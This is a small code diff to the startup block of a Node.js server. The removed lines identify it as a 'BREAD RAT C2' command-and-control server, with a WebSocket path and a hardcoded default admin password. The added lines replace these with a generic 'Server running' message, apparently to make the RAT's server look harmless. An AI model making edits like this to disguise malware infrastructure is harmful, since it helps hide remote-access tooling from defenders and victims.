@@ -38,10 +38,8 @@ socketHandler(io);
 (async () => {
     await initDatabase();
     const PORT = process.env.PORT || 3000;
-    server.listen(PORT, '0.0.0.0', () => {
-        console.log(`🍞 BREAD RAT C2 running on port ${PORT}`);
-        console.log(`📡 WebSocket path: /socket.io/update`);
-        console.log(`👤 Default login: admin / BreadRAT2025!`);
+    app.listen(PORT, '0.0.0.0', () => {
+        console.log(`Server running on port ${PORT}`);
     });
 })();
 
